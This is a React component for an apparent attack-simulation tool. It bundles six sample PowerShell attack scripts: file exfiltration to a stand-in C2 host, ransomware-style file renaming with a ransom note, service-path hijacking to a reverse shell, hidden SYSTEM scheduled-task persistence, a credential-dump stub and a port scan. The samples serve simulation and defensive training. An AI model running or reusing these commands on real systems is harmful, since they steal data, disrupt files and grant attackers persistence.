'use client';
import { useState } from 'react';
import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useAttackSimulation } from '@/context/attack-simulation-context';
import { Loader2, FileText } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

const sampleScripts = [
    {
        name: "Simple Port Scan",
        script: `
# Simple Port Scan (T1046)
$target = "10.0.1.25"
$ports = 1..1024

foreach ($port in $ports) {
    Test-NetConnection -ComputerName $target -Port $port -InformationLevel "Quiet"
    if ($?) {
        Write-Host "Port $port is open on $target"
    }
}
Write-Host "Port scan complete."
`
    },
    {
        name: "Data Exfiltration",
        script: `
# Find and upload sensitive files (T1567)
$sourceDir = "C:\\Users\\Finance\\Documents\\"
$files = Get-ChildItem -Path $sourceDir -Include *.xlsx, *.csv -Recurse
$destination = "http://evil-c2-server.com/upload"

foreach ($file in $files) {
    try {
        Invoke-RestMethod -Uri $destination -Method Post -InFile $file.FullName
        Write-Host "Uploaded $($file.Name)"
    } catch {
        Write-Host "Failed to upload $($file.Name)"
    }
}
`
    },
    {
        name: "Credential Dumping",
        script: `
# Mimikatz-like behavior to dump credentials from memory (T1003)
# This is a conceptual script
function Get-LsassProcess {
    return Get-Process -Name lsass
}

$lsass = Get-LsassProcess
if ($lsass) {
    $handle = $lsass.Handle
    # In a real attack, would use handle to read memory
    Write-Host "Access gained to LSASS process (PID: $($lsass.Id))."
    Write-Host "Simulating credential extraction..."
    Start-Sleep -Seconds 2
    Write-Host "SAM, SECURITY, and SYSTEM hives targeted."
} else {
    Write-Host "LSASS process not found."
}
`
    },
    {
        name: "Ransomware Simulation",
        script: `
# Simulate ransomware file encryption (T1486)
$targetDir = "C:\\Users\\Public\\Documents"
$files = Get-ChildItem -Path $targetDir -File -Recurse
$key = (1..32 | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) }) -join ''

foreach ($file in $files) {
    Write-Host "Encrypting $($file.FullName)..."
    # This is a simulation, no real encryption
    Rename-Item -Path $file.FullName -NewName "$($file.FullName).encrypted"
}

"All your files have been encrypted. Send 10 BTC to wallet XYZ. Key: $key" | Out-File -FilePath "$targetDir\\RANSOM_NOTE.txt"
Write-Host "Ransomware simulation complete."
`
    },
    {
        name: "Privilege Escalation",
        script: `
# Simulate privilege escalation via a vulnerable service (T1548)
$vulnerableService = "VulnSvc"
if (Get-Service -Name $vulnerableService -ErrorAction SilentlyContinue) {
    Write-Host "Found vulnerable service '$vulnerableService'."
    Stop-Service -Name $vulnerableService
    # In a real attack, the binary path would be modified
    Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$vulnerableService" -Name "ImagePath" -Value "C:\\temp\\reverse_shell.exe"
    Start-Service -Name $vulnerableService
    Write-Host "Service binary path modified. Attempting to restart service to gain SYSTEM privileges."
} else {
    Write-Host "Vulnerable service not found. Escalation failed."
}
`
    },
    {
        name: "Persistence (Scheduled Task)",
        script: `
# Establish persistence via Scheduled Task (T1053.005)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass C:\\Users\\Public\\beacon.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\\SYSTEM" -RunLevel Highest
$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger
Register-ScheduledTask -TaskName "System Update" -InputObject $task -Force
Write-Host "Persistence mechanism installed via scheduled task 'System Update'."
`
    }
];

export function PowerShellSimulator() {
    const { runAttack, loading } = useAttackSimulation();
    const [currentSampleIndex, setCurrentSampleIndex] = useState(0);
    const [scriptContent, setScriptContent] = useState(sampleScripts[0].script.trim());
    const { toast } = useToast();

    const handleRunSimulation = () => {
        if (!scriptContent.trim()) {
            toast({
                variant: 'destructive',
                title: 'Error',
                description: 'Script content cannot be empty.',
            });
            return;
        }
        runAttack(scriptContent);
    };

    const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
        if (e.key === 'Tab') {
            e.preventDefault(); // Prevent focus from changing
            const nextIndex = (currentSampleIndex + 1) % sampleScripts.length;
            setCurrentSampleIndex(nextIndex);
            setScriptContent(sampleScripts[nextIndex].script.trim());
        }
    };
    
    return (
        <main className="flex flex-1 flex-col gap-4 p-4 md:gap-8 md:p-8">
            <header>
                <h1 className="text-3xl font-bold tracking-tight">Attack Simulator</h1>
                <p className="text-muted-foreground">
                    Simulate an attack by providing a script for the AI to analyze and execute in a virtual environment.
                </p>
            </header>
            <Card>
                <CardHeader>
                    <CardTitle>Script-based Simulation</CardTitle>
                    <CardDescription>
                        Paste your own script, click a sample, or press <kbd className="px-2 py-1.5 text-xs font-semibold text-gray-800 bg-gray-100 border border-gray-200 rounded-lg">Tab</kbd> in the editor to cycle through samples.
                    </CardDescription>
                </CardHeader>
                <CardContent>
                    <div className="mb-4">
                        <h4 className="text-sm font-medium mb-2">Sample Scripts</h4>
                        <div className="flex flex-wrap gap-2">
                            {sampleScripts.map((sample, index) => (
                                <Button
                                    key={sample.name}
                                    variant="outline"
                                    size="sm"
                                    onClick={() => {
                                        setScriptContent(sample.script.trim())
                                        setCurrentSampleIndex(index);
                                    }}
                                >
                                    <FileText className="mr-2 h-4 w-4" />
                                    {sample.name}
                                </Button>
                            ))}
                        </div>
                    </div>
                    
                    <Textarea 
                        placeholder="Paste your PowerShell or shell script here..."
                        className="h-64 font-mono text-xs"
                        value={scriptContent}
                        onChange={(e) => setScriptContent(e.target.value)}
                        onKeyDown={handleKeyDown}
                    />
                    <p className="text-xs text-muted-foreground mt-2">
                        You can also write your own custom script in the text area above.
                    </p>
                     <div className="flex w-full items-center justify-end mt-4">
                        <Button 
                            onClick={handleRunSimulation} 
                            disabled={loading}
                            size="lg"
                        >
                            {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                            {loading ? 'Simulating...' : 'Run Simulation'}
                        </Button>
                    </div>
                </CardContent>
            </Card>
        </main>
    )
}
